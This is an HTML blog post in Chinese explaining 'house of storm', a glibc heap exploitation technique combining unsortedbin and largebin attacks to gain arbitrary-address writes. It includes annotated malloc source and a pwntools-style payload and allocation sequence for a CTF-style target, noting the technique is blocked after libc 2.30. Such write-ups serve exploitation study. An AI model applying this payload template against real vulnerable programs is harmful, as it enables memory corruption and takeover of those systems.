@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言一种结合了unsortedbin attack和largebin attack的攻击办法 可以达到任意地址写的效果 在学习这两个漏洞的时候 其各自效能不大 unsortedbin 受限于对于fake chunk的size域和bk域的检查 largebin attack受限于其只能单一的在任意地址写堆地址 但是如果将二者结合起来 就可以达到任意地址申请chunk的效果 不过这个办法也是旧时代的眼">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of storm">
+<meta property="og:url" content="http://example.com/2023/03/13/house-of-storm/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="前言一种结合了unsortedbin attack和largebin attack的攻击办法 可以达到任意地址写的效果 在学习这两个漏洞的时候 其各自效能不大 unsortedbin 受限于对于fake chunk的size域和bk域的检查 largebin attack受限于其只能单一的在任意地址写堆地址 但是如果将二者结合起来 就可以达到任意地址申请chunk的效果 不过这个办法也是旧时代的眼">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-13T05:10:20.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:19:42.013Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>house of storm</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/14/%E6%89%8B%E5%86%99%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2payload/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/04/LargebinAttack/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/13/house-of-storm/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/13/house-of-storm/&text=house of storm"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/13/house-of-storm/&is_video=false&description=house of storm"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=house of storm&body=Check out this article: http://example.com/2023/03/13/house-of-storm/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/13/house-of-storm/&name=house of storm&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/13/house-of-storm/&t=house of storm"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">实际利用</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        house of storm
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-13T05:10:20.000Z" class="dt-published" itemprop="datePublished">2023-03-13</time>
+        
+        (Updated: <time datetime="2023-09-14T17:19:42.013Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/heap/">heap</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一种结合了unsortedbin attack和largebin attack的攻击办法 可以达到任意地址写的效果</p>
+<p>在学习这两个漏洞的时候 其各自效能不大 unsortedbin 受限于对于fake chunk的size域和bk域的检查</p>
+<p>largebin attack受限于其只能单一的在任意地址写堆地址</p>
+<p>但是如果将二者结合起来 就可以达到任意地址申请chunk的效果</p>
+<p>不过这个办法也是旧时代的眼泪了 在libc2.30以后就诞生了新的检查机制来防止</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先我们要清楚整个漏洞的触发流程 先是利用unsortedbin chunk放入到largebin chunk中 从而将fake chunk链入unsorted_chunks (av)</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">   unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">// 把 fake_chunk 链入 unsorted_chunks(av)</span></span><br><span class="line">   bck-&gt;fd = unsorted_chunks (av);  <span class="comment">// 把 fake_chunk 的 fd 改成 unsorted_chunks (av)</span></span><br></pre></td></tr></table></figure>
+
+<p>同时还可以将fake chunk的fd域修改为unsorted_chunks (av)</p>
+<p>为了达到这一目的 我们就需要更改unsortedbin chunk的bk域为fakechunk_addr - 0x10</p>
+<p>这里之所以还要减去0x10 是为了腾出size域和prev_size域的空间</p>
+<p>紧接着我们需要利用largebin attack来写fake chunk的size域 以及完善fake chunk的结构 以供绕过双向链表的检测</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd; <span class="comment">//unsortedbin的fd_nextsize域被设置为了largebin chunk的首地址</span></span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//unsortebin的bk_nextsize域被设置为largebin的bk_nextsize</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim; <span class="comment">//把largebin的bk_nextsize域设置为unsortedbin的首地址</span></span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//这里就是伪造size的关键句 将unsortedbin的bk_nextsize指向的地址+0x20处填入unsortedbin地址</span></span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;  <span class="comment">//把 unsorted bin 里刚放进的 chunk-&gt;bk 改为 large bin-&gt;bk</span></span><br><span class="line">          victim-&gt;fd = fwd;  <span class="comment">//把 unsorted bin 里刚放进的 chunk-&gt;fd 改为 large bin</span></span><br><span class="line">          fwd-&gt;bk = victim;  <span class="comment">//把 large bin 的 chunk-&gt;bk 改为 unsorted bin 里刚放进的 chunk 的首地址</span></span><br><span class="line">          bck-&gt;fd = victim;  <span class="comment">//这里伪造了fake chunk的bk域 </span></span><br><span class="line"><span class="comment">//bck = fwd-&gt;bk</span></span><br><span class="line"><span class="comment">//bck-&gt;fd = (fwd-&gt;bk)+0x10</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>为了配合上述的源代码 我们需要将两个chunk的布局构造成下面这样</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr_addr = 你想要任意写的地址-<span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr) <span class="comment">#unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(ptr_addr-<span class="number">0x18</span>-<span class="number">5</span>) <span class="comment">#largebin</span></span><br></pre></td></tr></table></figure>
+
+<p>具体的数值计算就自己根据源码来看了 应该挺好懂的  还有一点需要注意的就是unsoretbin chunk和largebin chunk的释放时机</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2  largebin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4  unsortedbin</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ptr_addr = <span class="number">0xABCD0500</span>-<span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(ptr_addr-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
+
+<p>你可以看到 要先释放largebin chunk 这是因为要将size小的放在链表头 不然后续无法将其放入largebin</p>
+<p>总体利用还是比较简单的 难在理解</p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">实际利用</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/13/house-of-storm/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/13/house-of-storm/&text=house of storm"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/13/house-of-storm/&is_video=false&description=house of storm"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=house of storm&body=Check out this article: http://example.com/2023/03/13/house-of-storm/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/13/house-of-storm/&title=house of storm"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/13/house-of-storm/&name=house of storm&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/13/house-of-storm/&t=house of storm"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
